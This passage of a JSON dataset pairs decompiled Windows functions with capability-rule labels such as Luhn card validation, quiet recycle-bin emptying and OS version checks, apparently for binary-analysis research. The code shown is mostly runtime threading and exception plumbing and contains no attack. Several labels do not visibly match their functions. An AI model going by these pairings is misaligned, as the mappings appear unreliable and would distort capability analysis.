code_r0x00402650;\n        case 0x402660:\n            goto code_r0x00402660;\n        }\n        return iVar5;\n    }\ncode_r0x00402660:\n    iVar5 = fcn.00403be0(arg1);\n    if (**(arg1 + 0x18) != 'I') {\n        return iVar5;\n    }\n    if (iVar5 != 0) {\n        iVar1 = *(arg1 + 0x38);\n        if (iVar1 < *(arg1 + 0x3c)) {\n            *(*(arg1 + 0x30) + iVar1 * 8) = iVar5;\n            *(arg1 + 0x38) = iVar1 + 1;\n            uVar6 = fcn.004023a0(arg1);\n            iVar5 = fcn.004017e0(arg1, 4, iVar5, uVar6);\n            return iVar5;\n        }\n        return 0;\n    }\n    return 0;\ncode_r0x00402771:\n    if ((arg4 == 0) || (iVar1 = *(arg1 + 0x38),  *(arg1 + 0x3c) <= iVar1)) {\ncode_r0x00402650:\n        *piVar3 = 0;\n        return 0;\n    }\n    *(*(arg1 + 0x30) + iVar1 * 8) = arg4;\n    *(arg1 + 0x38) = iVar1 + 1;\ncode_r0x00402797:\n    pcVar8 = *(arg1 + 0x18);\n    cVar9 = *pcVar8;\n    goto joined_r0x004025d2;\n}\n",
        "token_count": 2233
    },
    "00404650": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00401850)\n\nulong fcn.00404650(int64_t arg1, ulong arg2)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    int64_t *piVar3;\n    int64_t iStack32;\n    \n    iStack32 = 0;\n    piVar3 = &iStack32;\n    if (**(arg1 + 0x18) == arg2) {\n        *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n    // WARNING: Could not recover jumptable at 0x004017f7. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar1 = (*(*0x42d318 + 0x42d260))(arg1, 0x2e, 0, 0);\n        return uVar1;\n    }\n    while( true ) {\n        iVar2 = fcn.00404020(arg1);\n        if (iVar2 == 0) {\n            return 0;\n        }\n        iVar2 = fcn.004017e0(arg1, 0x2e, iVar2, 0);\n        *piVar3 = iVar2;\n        if (iVar2 == 0) break;\n        piVar3 = iVar2 + 0x10;\n        if (**(arg1 + 0x18) == arg2) {\n            *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n            return iStack32;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 353
    },
    "00409b00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nulong fcn.00409b00(ulong arg1)\n\n{\n    ulong uVar1;\n    int64_t iStack24;\n    ulong uStack16;\n    \n    iStack24 = fcn.00409ae0(*0x434aa0);\n    if (iStack24 != -1) {\n        sub.msvcrt.dll__lock(8);\n        iStack24 = fcn.00409ae0(*0x434aa0);\n        uStack16 = fcn.00409ae0(*0x434aa8);\n        uVar1 = sub.msvcrt.dll___dllonexit(arg1, &iStack24, &uStack16);\n        *0x434aa0 = fcn.00409af0(iStack24);\n        *0x434aa8 = fcn.00409af0(uStack16);\n        sub.msvcrt.dll__unlock(8);\n        return uVar1;\n    }\n    uVar1 = (*_sym.imp.msvcrt.dll__onexit)(arg1);\n    return uVar1;\n}\n",
        "token_count": 226
    },
    "00411ea0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint64_t fcn.00411ea0(int32_t **arg1)\n\n{\n    int32_t *arg1_00;\n    ulong *puVar1;\n    int32_t *arg1_01;\n    code *pcVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int64_t iVar7;\n    ulong uVar8;\n    uint64_t uVar9;\n    int64_t iVar10;\n    uint64_t uVar11;\n    char *arg1_02;\n    uint32_t uVar12;\n    ulong auStack184 [5];\n    ulong uStack144;\n    ulong uStack136;\n    uint64_t auStack128 [2];\n    \n    uVar11 = fcn.00411360(arg1);\n    if (uVar11 != 0) {\n        return uVar11;\n    }\n    arg1_01 = *arg1;\n    if (arg1_01[2] == 0) {\n        arg1_00 = arg1_01 + 8;\n        uVar6 = fcn.00410710(arg1_00);\n        if (uVar6 == 0) {\n            LOCK();\n            arg1_01[4] = arg1_01[4] + 1;\n            if (arg1_01[4] == 0) {\n                uVar6 = fcn.00412dd0(arg1_01 + 10);\n                uVar12 = fcn.00410100(arg1_00);\n                if (uVar6 == 0) {\n                    uVar6 = uVar12;\n                }\n            }\n            else {\n                uVar6 = fcn.00410100(arg1_00);\n            }\n        }\n    }\n    else {\n        LOCK();\n        arg1_01[2] = arg1_01[2] + -1;\n        uVar6 = fcn.004115c0(arg1_01, 0);\n    }\n    auStack128[0] = uVar6;\n    if (*0x434a58 == 0) {\n        *0x434a58 = fcn.00410a00(\"rwl_global_shmem\", 0x10, 0x411320);\n    }\n    fcn.00410db0(*0x434a58);\n    if ((**arg1 == -0x454e0f13) && (0 < (*arg1)[1])) {\n        (*arg1)[1] = (*arg1)[1] + -1;\n        if (*0x434a58 != 0) {\n            fcn.00410d10(*0x434a58);\n            return auStack128[0];\n        }\n        *0x434a58 = fcn.00410a00(\"rwl_global_shmem\", 0x10, 0x411320);\n        fcn.00410d10(*0x434a58);\n        return auStack128[0];\n    }\n    iVar10 = (*_sym.imp.msvcrt.dll___iob_func)();\n    sub.msvcrt.dll_fprintf\n              (iVar10 + 0x60, \"Assertion failed: (%s), file %s, line %d\\n\", \n               \"(((rwlock_t *)*rwl)->valid == LIFE_RWLOCK) && (((rwlock_t *)*rwl)->busy > 0)\");\n    sub.msvcrt.dll_exit(1);\n    arg1_02 = \"rwl_global_shmem\";\n    auStack184[0] = 0x410a26;\n    uStack136 = arg1;\n    iVar4 = sub.msvcrt.dll_strlen();\n    auStack184[0] = 0x410a3e;\n    iVar7 = fcn.0040b810(arg1_02);\n    iVar7 = -iVar7;\n    iVar10 = &uStack144 + iVar7;\n    *(&uStack144 + iVar7) = 0x656d68732d636367;\n    *(&uStack136 + iVar7) = 0x64742d6d;\n    *(&uStack136 + iVar7 + 4) = 0x326d;\n    uVar6 = iVar4 + 0x50;\n    *(&uStack136 + iVar7 + 6) = 0x2d;\n    *(auStack184 + iVar7) = 0x410a86;\n    sub.msvcrt.dll_memcpy(&uStack136 + iVar7 + 7, \"rwl_global_shmem\", iVar4);\n    puVar1 = auStack128 + iVar4 + iVar7;\n    *puVar1 = 0x6161616161616161;\n    puVar1[1] = 0x6161616161616161;\n    puVar1[2] = 0x6161616161616161;\n    puVar1[3] = 0x6161616161616161;\n    puVar1[4] = 0x6161616161616161;\n    puVar1[5] = 0x6161616161616161;\n    puVar1[6] = 0x6161616161616161;\n    puVar1[7] = 0x6161616161616161;\n    *(&uStack144 + uVar6 + iVar7) = 0;\n    *(&uStack144 + (iVar4 + 0xf) + iVar7) = 0;\n    *(auStack184 + iVar7) = 0x410ace;\n    uVar8 = (*_sym.imp.KERNEL32.dll_CreateMutexA)(0, 0);\n    *(&uStack144 + (iVar4 + 0xf) + iVar7) = 0x2d;\n    *(auStack184 + iVar7) = 0x410ae4;\n    iVar5 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(uVar8, 0xffffffff);\n    if (iVar5 != 0) {\n        pcVar2 = swi(3);\n        uVar11 = (*pcVar2)();\n        return uVar11;\n    }\n    *(auStack184 + iVar7) = 0x410af2;\n    uVar3 = (*_sym.imp.KERNEL32.dll_FindAtomA)();\n    if (uVar3 == 0) {\n        *(auStack184 + iVar7) = 0x410b07;\n        uVar9 = sub.msvcrt.dll_malloc(0x10);\n        uVar11 = 0x40;\n        do {\n            if ((uVar9 >> (uVar11 & 0x3f) & 1) != 0) {\n                *(iVar10 + (uVar6 - uVar11)) = 0x41;\n            }\n            uVar12 = uVar11 - 1;\n            uVar11 = uVar12;\n        } while (uVar12 != 0);\n        *(auStack184 + iVar7) = 0x410b33;\n        uVar3 = (*_sym.imp.KERNEL32.dll_AddAtomA)();\n        if (uVar3 == 0) {\n            pcVar2 = swi(3);\n            uVar11 = (*pcVar2)();\n            return uVar11;\n        }\n        *(auStack184 + iVar7) = 0x410b49;\n        uVar11 = fcn.00410980(uVar3, iVar10, uVar6, iVar4 + 0x10);\n        if (uVar11 == uVar9) {\n            *(auStack184 + iVar7) = 0x410ba6;\n            sub.msvcrt.dll_memset(uVar9, 0, 0x10);\n            *(auStack184 + iVar7) = 0x410bb1;\n            (*0x411320)(uVar9);\n        }\n        else {\n            *(auStack184 + iVar7) = 0x410b59;\n            sub.msvcrt.dll_free(uVar9);\n        }\n    }\n    else {\n        *(auStack184 + iVar7) = 0x410b94;\n        uVar11 = fcn.00410980(uVar3, iVar10, uVar6, iVar4 + 0x10);\n    }\n    *(auStack184 + iVar7) = 0x410b62;\n    (*_sym.imp.KERNEL32.dll_ReleaseMutex)(uVar8);\n    *(auStack184 + iVar7) = 0x410b6b;\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar8);\n    return uVar11;\n}\n",
        "token_count": 1861
    },
    "004122b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint64_t fcn.004122b0(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    int64_t iStack24;\n    uint16_t uStack16;\n    \n    uVar1 = *(arg1 + 1) / 1000000 + *arg1 * 1000;\n    (*_sym.imp.msvcrt.dll__ftime)(&iStack24);\n    uVar3 = iStack24 * 1000 + uStack16;\n    iVar2 = 0;\n    if (uVar3 <= uVar1) {\n        iVar2 = uVar1 - uVar3;\n    }\n    return iVar2;\n}\n",
        "token_count": 158
    },
    "00413790": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.00413790(int64_t *arg1, int64_t *arg2, ulong *arg3)\n\n{\n    char cVar1;\n    ulong *puStack32;\n    \n    puStack32 = *arg3;\n    cVar1 = (**(*arg2 + 0x10))(arg2);\n    if (cVar1 != '\\0') {\n        puStack32 = *puStack32;\n    }\n    cVar1 = (**(*arg1 + 0x20))(arg1, arg2, &puStack32, 1);\n    if (cVar1 != '\\0') {\n        *arg3 = puStack32;\n    }\n    return;\n}\n",
        "token_count": 147
    },
    "00415220": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.00415220(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    ulong *puVar1;\n    int64_t iVar2;\n    \n    puVar1 = *0x42c330;\n    *(arg1 + -0xa0) = 1;\n    *(arg1 + -0x90) = arg2;\n    *(arg1 + -0x88) = arg3;\n    iVar2 = arg1;\n    if (puVar1 == NULL) goto code_r0x00415295;\n    do {\n        *(iVar2 + -0x80) = *puVar1;\n        if (*0x42c320 == NULL) {\n            *0x42c320 = fcn.00413c50();\n        }\n        arg1 = iVar2 + -0x40;\n        *(iVar2 + -0x78) = **0x42c320;\n        *(iVar2 + -0x40) = 0x474e5543432b2b00;\n        *(iVar2 + -0x38) = 0x4139d0;\n        fcn.0040b360(arg1);\n        fcn.00414ba0(arg1);\n        fcn.00414970();\ncode_r0x00415295:\n        puVar1 = fcn.00413c70();\n        iVar2 = arg1;\n        *0x42c330 = puVar1;\n    } while( true );\n}\n",
        "token_count": 316
    },
    "0040b150": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nulong fcn.0040b150(int32_t *arg1, int64_t arg2, ulong arg3, ulong *arg4)\n\n{\n    ulong *puVar1;\n    int32_t iVar2;\n    ulong uVar3;\n    uint32_t uVar4;\n    code *in_stack_00000028;\n    ulong uStack104;\n    ulong uStack96;\n    ulong uStack88;\n    ulong uStack80;\n    ulong *puStack72;\n    \n    uVar4 = arg1[1];\n    iVar2 = *arg1;\n    puVar1 = *(arg1 + 8);\n    if ((uVar4 & 0x20) == 0) {\n        if (iVar2 == 0x21474343) {\n            if (arg2 != *(arg1 + 10)) {\n                return 1;\n            }\n            (*_sym.imp.KERNEL32.dll_RtlUnwindEx)(arg2, *(arg1 + 0xc), arg1, puVar1, arg3, arg4[8]);\n            sub.msvcrt.dll_abort();\n        }\n        else {\n            uStack88 = 0xdeadbeef;\n            uStack80 = 0xdeadbeef;\n            uStack104 = *(arg4[5] + 0x98);\n            uStack96 = *arg4;\n            puStack72 = arg4;\n            if (iVar2 == 0x22474343) goto code_r0x0040b250;\n            if (iVar2 != 0x20474343) {\n                return 1;\n            }\n        }\n        if ((uVar4 & 6) == 0) {\n            iVar2 = (*in_stack_00000028)(1, 1, *puVar1, puVar1, &uStack104);\n            if (iVar2 != 8) {\n                if (iVar2 != 6) goto code_r0x0040b245;\n                iVar2 = (*in_stack_00000028)(1, 6, *puVar1, puVar1, &uStack104);\n                if (iVar2 != 7) goto code_r0x0040b245;\n                puVar1[3] = arg2;\n                puVar1[5] = uStack80;\n                puVar1[4] = uStack96;\n                *(arg1 + 0xe) = uStack80;\n                uVar3 = arg4[8];\n                arg1[6] = 4;\n                *(arg1 + 10) = arg2;\n                *(arg1 + 0xc) = uStack96;\n                (*_sym.imp.KERNEL32.dll_RtlUnwindEx)(arg2, uStack96, arg1, puVar1, arg3, uVar3);\n                goto code_r0x0040b245;\n            }\n        }\n        else {\n            uVar3 = 2;\n            while (iVar2 = (*in_stack_00000028)(1, uVar3, *puVar1, puVar1, &uStack104),  iVar2 != 8) {\n                if (iVar2 == 7) {\n                    *(arg1 + 10) = arg2;\n                    *(arg1 + 0xc) = uStack96;\n                    *(arg1 + 0xe) = uStack80;\n                    (*_sym.imp.KERNEL32.dll_RaiseException)(0x21474343, 1, 4, arg1 + 8);\n                }\ncode_r0x0040b245:\n                sub.msvcrt.dll_abort();\ncode_r0x0040b250:\n                (*puVar1[2])(1, 10, *puVar1, puVar1, &uStack104, puVar1[6]);\n                uVar3 = 10;\n            }\n        }\n    }\n    else {\n        *(arg4[5] + 0x88) = *(arg1 + 0xe);\n    }\n    return 1;\n}\n",
        "token_count": 855
    },
    "00413a20": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint8_t ** fcn.00413a20(ulong arg1, uint8_t **arg2, uint8_t **arg3, uint8_t **arg4)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint8_t **ppuVar3;\n    uint8_t **ppuVar4;\n    uint8_t uVar5;\n    uint8_t **ppuStack32;\n    \n    if (arg1 == 0x50) goto code_r0x00413b25;\n    if (0xc < (arg1 & 0xf)) {\ncode_r0x00413b20:\n        sub.msvcrt.dll_abort();\ncode_r0x00413b25:\n        ppuVar4 = arg3 + 7U & 0xfffffffffffffff8;\n        *arg4 = *ppuVar4;\n        return ppuVar4 + 1;\n    }\n    // switch table (13 cases) at 0x42d060\n    switch(*((arg1 & 0xf) * 4 + 0x42d060) + 0x42d060) {\n    case 0x413a55:\n        ppuStack32 = *arg3;\n        ppuVar4 = arg3 + 1;\n        break;\n    case 0x413a82:\n        ppuStack32 = *arg3;\n        ppuVar4 = arg3 + 2;\n        break;\n    case 0x413a90:\n        ppuStack32 = NULL;\n        uVar5 = 0;\n        ppuVar3 = arg3;\n        do {\n            ppuVar4 = ppuVar3 + 1;\n            uVar1 = *ppuVar3;\n            uVar2 = uVar5 & 0x3f;\n            uVar5 = uVar5 + 7;\n            ppuStack32 = ppuStack32 | (uVar1 & 0x7f) << uVar2;\n            ppuVar3 = ppuVar4;\n        } while (uVar1 < '\\0');\n        break;\n    case 0x413ac0:\n        ppuStack32 = *arg3;\n        ppuVar4 = arg3 + 2;\n        break;\n    case 0x413ad0:\n        ppuStack32 = *arg3;\n        ppuVar4 = arg3 + 4;\n        break;\n    case 0x413ae0:\n        ppuStack32 = *arg3;\n        ppuVar4 = arg3 + 4;\n        break;\n    case 0x413af0:\n        ppuVar4 = fcn.00413660(arg3, &ppuStack32);\n        break;\n    case 0x413b20:\n        goto code_r0x00413b20;\n    }\n    if (ppuStack32 != NULL) {\n        if ((arg1 & 0x70) != 0x10) {\n            arg3 = arg2;\n        }\n        ppuStack32 = ppuStack32 + arg3;\n        if (arg1 < '\\0') {\n            ppuStack32 = *ppuStack32;\n        }\n    }\n    *arg4 = ppuStack32;\n    return ppuVar4;\n}\n",
        "token_count": 707
    },
    "0040c6e0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t * fcn.0040c6e0(char *param_1)\n\n{\n    code *pcVar1;\n    bool bVar2;\n    int32_t **ppiVar3;\n    uint16_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint64_t *puVar7;\n    int64_t iVar8;\n    int32_t *piVar9;\n    int64_t iVar10;\n    ulong uVar11;\n    int32_t *piVar12;\n    uint64_t uVar13;\n    char *arg1;\n    uint64_t uVar14;\n    uint64_t uVar15;\n    uint64_t uVar16;\n    ulong *puVar17;\n    ulong *puVar18;\n    uint32_t uVar19;\n    uint32_t uVar20;\n    bool bVar21;\n    ulong auStack224 [5];\n    ulong uStack184;\n    ulong uStack176;\n    int32_t *apiStack168 [4];\n    \n    if (*0x4349e8 == NULL) {\n        param_1 = \"_pthread_tls_shmem\";\n        *0x4349e8 = fcn.00410a00(\"_pthread_tls_shmem\", 4, 0x40b990);\n    }\n    piVar9 = *0x4349e8;\n    iVar5 = (*_sym.imp.KERNEL32.dll_TlsAlloc)();\n    *piVar9 = iVar5;\n    if (*0x4349e8 == NULL) {\n        param_1 = \"_pthread_tls_shmem\";\n        *0x4349e8 = fcn.00410a00(\"_pthread_tls_shmem\", 4, 0x40b990);\n    }\n    if (**0x4349e8 != -1) {\n        return *0x4349e8;\n    }\n    sub.msvcrt.dll_abort();\n    if (*0x4349b8 == NULL) {\n        *0x4349b8 = fcn.00410a00(\"mtx_pthr_locked_shmem\", 8, 0x40b9b0);\n    }\n    fcn.00410710(*0x4349b8);\n    uVar14 = *(param_1 + 0x1d8);\n    if (uVar14 != 0) {\n        if (*0x4349a8 == NULL) {\n            *0x4349a8 = fcn.00410a00(\"idListCnt_shmem\", 8, 0);\n        }\n        if (**0x4349a8 != 0) {\n            if (*0x4349a8 == NULL) {\n                *0x4349a8 = fcn.00410a00(\"idListCnt_shmem\", 8, 0);\n            }\n            uVar16 = 0;\n            uVar13 = **0x4349a8 - 1;\n            do {\n                uVar15 = uVar16 + uVar13 >> 1;\n                if (*0x4349b0 == NULL) {\n                    *0x4349b0 = fcn.00410a00(\"idList_shmem\", 8, 0);\n                    if (uVar14 == *(**0x4349b0 + 8 + uVar15 * 0x10)) goto code_r0x0040c96b;\n                    if (*0x4349b0 == NULL) {\n                        *0x4349b0 = fcn.00410a00(\"idList_shmem\", 8, 0);\n                    }\n                }\n                else if (uVar14 == *(**0x4349b0 + 8 + uVar15 * 0x10)) {\ncode_r0x0040c96b:\n                    if (*0x4349b0 == NULL) {\n                        *0x4349b0 = fcn.00410a00(\"idList_shmem\", 8, 0);\n                    }\n                    uVar15 = uVar15 + 1;\n                    if (*0x4349a8 == NULL) {\n                        *0x4349a8 = fcn.00410a00(\"idListCnt_shmem\", 8, 0);\n                        if (uVar15 < **0x4349a8) {\n                            if (*0x4349a8 == NULL) {\n                                *0x4349a8 = fcn.00410a00(\"idListCnt_shmem\", 8, 0);\n                            }\n                            goto code_r0x0040cb24;\n                        }\n                    }\n                    else if (uVar15 < **0x4349a8) {\ncode_r0x0040cb24:\n                        if (*0x4349b0 == NULL) {\n                            *0x4349b0 = fcn.00410a00(\"idList_shmem\", 8, 0);\n                        }\n                        sub.msvcrt.dll_memmove(**0x4349b0 + -0x10 + uVar15 * 0x10, **0x4349b0 + uVar15 * 0x10);\n                    }\n                    puVar7 = *0x4349a8;\n                    if (*0x4349a8 == NULL) {\n                        puVar7 = fcn.00410a00(\"idListCnt_shmem\", 8, 0);\n                        *0x4349a8 = puVar7;\n                        *puVar7 = *puVar7 - 1;\n                        if (puVar7 == NULL) {\n                            puVar7 = fcn.00410a00(\"idListCnt_shmem\", 8, 0);\n                            *0x4349a8 = puVar7;\n                        }\n                    }\n                    else {\n                        **0x4349a8 = **0x4349a8 - 1;\n                    }\n                    if (*puVar7 == 0) {\n                        if (*0x4349b0 == NULL) {\n                            *0x4349b0 = fcn.00410a00(\"idList_shmem\", 8, 0);\n                        }\n                        sub.msvcrt.dll_free(**0x4349b0);\n                        if (*0x4349a8 == NULL) {\n                            *0x4349a8 = fcn.00410a00(\"idListCnt_shmem\", 8, 0);\n                        }\n                        puVar7 = *0x4349a8;\n                        if (*0x4349a0 == NULL) {\n                            *0x4349a0 = fcn.00410a00(\"idListMax_shmem\", 8, 0);\n                        }\n                        **0x4349a0 = 0;\n                        *puVar7 = 0;\n                    }\n                    break;\n                }\n                if (uVar14 < *(**0x4349b0 + 8 + uVar15 * 0x10)) {\n                    if (uVar16 == uVar15) break;\n                    uVar13 = uVar15 - 1;\n                }\n                else {\n                    uVar16 = uVar15 + 1;\n                }\n            } while (uVar16 <= uVar13);\n        }\n    }\n    if (*(param_1 + 0x50) != 0) {\n        sub.msvcrt.dll_free();\n    }\n    if (*(param_1 + 0x58) != 0) {\n        sub.msvcrt.dll_free();\n    }\n    uVar14 = 0x1e0;\n    bVar2 = false;\n    iVar5 = 0x1e0;\n    bVar21 = false;\n    if ((param_1 & 1) == 0) {\n        puVar17 = param_1;\n        if ((param_1 & 2) != 0) goto code_r0x0040ca10;\ncode_r0x0040c7cc:\n        uVar20 = uVar14;\n    }\n    else {\n        puVar17 = param_1 + 1;\n        *param_1 = 0;\n        uVar14 = 0x1df;\n        bVar2 = true;\n        iVar5 = 0x1df;\n        bVar21 = true;\n        if ((puVar17 & 2) == 0) goto code_r0x0040c7cc;\ncode_r0x0040ca10:\n        uVar20 = iVar5 - 2;\n        uVar14 = uVar20;\n        *puVar17 = 0;\n        puVar17 = puVar17 + 2;\n        bVar2 = bVar21;\n    }\n    if ((puVar17 & 4) != 0) {\n        *puVar17 = 0;\n        uVar14 = uVar20 - 4;\n        puVar17 = puVar17 + 4;\n    }\n    for (uVar13 = uVar14 >> 3; uVar13 != 0; uVar13 = uVar13 - 1) {\n        *puVar17 = 0;\n        puVar17 = puVar17 + 1;\n    }\n    if ((uVar14 & 4) != 0) {\n        *puVar17 = 0;\n        puVar17 = puVar17 + 4;\n    }\n    puVar18 = puVar17;\n    if ((uVar14 & 2) != 0) {\n        puVar18 = puVar17 + 2;\n        *puVar17 = 0;\n    }\n    if (bVar2) {\n        *puVar18 = 0;\n    }\n    if (*0x4349c0 == NULL) {\n        *0x4349c0 = fcn.00410a00(\"pthr_last_shmem\", 8, 0);\n    }\n    if (**0x4349c0 == 0) {\n        if (*0x4349c8 == NULL) {\n            *0x4349c8 = fcn.00410a00(\"pthr_root_shmem\", 8, 0);\n        }\n        puVar17 = *0x4349c8;\n        if (*0x4349c0 == NULL) {\n            *0x4349c0 = fcn.00410a00(\"pthr_last_shmem\", 8, 0);\n        }\n        **0x4349c0 = param_1;\n        *puVar17 = param_1;\n    }\n    else {\n        if (*0x4349c0 == NULL) {\n            *0x4349c0 = fcn.00410a00(\"pthr_last_shmem\", 8, 0);\n        }\n        *(**0x4349c0 + 0x1d0) = param_1;\n    }\n    if (*0x4349b8 == NULL) {\n        *0x4349b8 = fcn.00410a00(\"mtx_pthr_locked_shmem\", 8, 0x40b9b0);\n    }\n    ppiVar3 = *0x4349b8;\n    piVar9 = fcn.0040fb90(*0x4349b8);\n    if (piVar9 != 0) {\n        return piVar9;\n    }\n    uStack176 = *ppiVar3;\n    if (uStack176[2] == 0) {\n        uVar20 = 1;\n        if (uStack176[5] == 0) goto code_r0x0040fec0;\n        goto code_r0x00410130;\n    }\n    iVar5 = uStack176[5];\n    if (iVar5 != 0) {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        if (iVar5 == iVar6) {\n            if (uStack176[2] == 2) {\n                LOCK();\n                piVar9 = uStack176 + 3;\n                iVar5 = *piVar9;\n                *piVar9 = *piVar9 + -1;\n                if (iVar5 == 1) goto code_r0x00410130;\ncode_r0x00410152:\n                uVar20 = 0;\n            }\n            else {\ncode_r0x00410130:\n                uStack176[5] = 0;\n                if (*(uStack176 + 6) == 0) goto code_r0x00410152;\n                iVar5 = (*_sym.imp.KERNEL32.dll_ReleaseSemaphore)(*(uStack176 + 6), 1, 0);\n                if (iVar5 != 0) goto code_r0x00410152;\n                iVar5 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n                uVar20 = 1;\n                uStack176[5] = iVar5;\n            }\n            uStack176 = *ppiVar3;\n            goto code_r0x0040fec0;\n        }\n        uStack176 = *ppiVar3;\n    }\n    uVar20 = 1;\ncode_r0x0040fec0:\n    apiStack168[0] = uVar20;\n    if (*0x434a38 == 0) {\n        *0x434a38 = fcn.00410a00(\"mutex_global_shmem\", 0x10, 0x40fb30);\n    }\n    fcn.00410db0(*0x434a38);\n    iVar8 = *0x434a38;\n    if ((*uStack176 == -0x454e0ff3) && (0 < uStack176[1])) {\n        bVar21 = *0x434a38 == 0;\n        uStack176[1] = uStack176[1] + -1;\n        if (bVar21) {\n            *0x434a38 = fcn.00410a00(\"mutex_global_shmem\", 0x10, 0x40fb30);\n            fcn.00410d10(*0x434a38);\n            return apiStack168[0];\n        }\n        fcn.00410d10(iVar8);\n        return apiStack168[0];\n    }\n    iVar8 = (*_sym.imp.msvcrt.dll___iob_func)();\n    sub.msvcrt.dll_fprintf(iVar8 + 0x60, 0x42f208, \"(m_->valid == LIFE_MUTEX) && (m_->busy > 0)\");\n    sub.msvcrt.dll_exit(1);\n    arg1 = \"mutex_global_shmem\";\n    auStack224[0] = 0x410a26;\n    iVar5 = sub.msvcrt.dll_strlen();\n    auStack224[0] = 0x410a3e;\n    iVar10 = fcn.0040b810(arg1);\n    iVar10 = -iVar10;\n    iVar8 = &uStack184 + iVar10;\n    *(&uStack184 + iVar10) = 0x656d68732d636367;\n    *(&uStack176 + iVar10) = 0x64742d6d;\n    *(&uStack176 + iVar10 + 4) = 0x326d;\n    uVar20 = iVar5 + 0x50;\n    *(&uStack176 + iVar10 + 6) = 0x2d;\n    *(auStack224 + iVar10) = 0x410a86;\n    sub.msvcrt.dll_memcpy(&uStack176 + iVar10 + 7, \"mutex_global_shmem\", iVar5);\n    puVar17 = apiStack168 + iVar5 + iVar10;\n    *puVar17 = 0x6161616161616161;\n    puVar17[1] = 0x6161616161616161;\n    puVar17[2] = 0x6161616161616161;\n    puVar17[3] = 0x6161616161616161;\n    puVar17[4] = 0x6161616161616161;\n    puVar17[5] = 0x6161616161616161;\n    puVar17[6] = 0x6161616161616161;\n    puVar17[7] = 0x6161616161616161;\n    *(&uStack184 + uVar20 + iVar10) = 0;\n    *(&uStack184 + (iVar5 + 0xf) + iVar10) = 0;\n    *(auStack224 + iVar10) = 0x410ace;\n    uVar11 = (*_sym.imp.KERNEL32.dll_CreateMutexA)(0, 0);\n    *(&uStack184 + (iVar5 + 0xf) + iVar10) = 0x2d;\n    *(auStack224 + iVar10) = 0x410ae4;\n    iVar6 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(uVar11, 0xffffffff);\n    if (iVar6 != 0) {\n        pcVar1 = swi(3);\n        piVar9 = (*pcVar1)();\n        return piVar9;\n    }\n    *(auStack224 + iVar10) = 0x410af2;\n    uVar4 = (*_sym.imp.KERNEL32.dll_FindAtomA)();\n    if (uVar4 == 0) {\n        *(auStack224 + iVar10) = 0x410b07;\n        piVar12 = sub.msvcrt.dll_malloc(0x10);\n        uVar14 = 0x40;\n        do {\n            if ((piVar12 >> (uVar14 & 0x3f) & 1) != 0) {\n                *(iVar8 + (uVar20 - uVar14)) = 0x41;\n            }\n            uVar19 = uVar14 - 1;\n            uVar14 = uVar19;\n        } while (uVar19 != 0);\n        *(auStack224 + iVar10) = 0x410b33;\n        uVar4 = (*_sym.imp.KERNEL32.dll_AddAtomA)();\n        if (uVar4 == 0) {\n            pcVar1 = swi(3);\n            piVar9 = (*pcVar1)();\n            return piVar9;\n        }\n        *(auStack224 + iVar10) = 0x410b49;\n        piVar9 = fcn.00410980(uVar4, iVar8, uVar20, iVar5 + 0x10);\n        if (piVar9 == piVar12) {\n            *(auStack224 + iVar10) = 0x410ba6;\n            sub.msvcrt.dll_memset(piVar12, 0, 0x10);\n            *(auStack224 + iVar10) = 0x410bb1;\n            (*0x40fb30)(piVar12);\n        }\n        else {\n            *(auStack224 + iVar10) = 0x410b59;\n            sub.msvcrt.dll_free(piVar12);\n        }\n    }\n    else {\n        *(auStack224 + iVar10) = 0x410b94;\n        piVar9 = fcn.00410980(uVar4, iVar8, uVar20, iVar5 + 0x10);\n    }\n    *(auStack224 + iVar10) = 0x410b62;\n    (*_sym.imp.KERNEL32.dll_ReleaseMutex)(uVar11);\n    